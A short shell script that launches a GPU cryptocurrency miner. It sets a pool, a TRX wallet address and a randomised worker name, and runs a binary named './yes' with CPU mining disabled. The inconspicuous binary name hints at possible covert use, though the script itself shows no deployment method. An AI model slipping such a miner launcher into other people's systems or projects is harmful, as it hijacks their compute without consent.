POOL=rx-us.unmineable.com:3333
WALLET=TRX:TQAz11yJWntpK9XUrQrEYwoQrq91WjREB9
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo vAxuJ7Ur-$(shuf -i 1911-576098 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
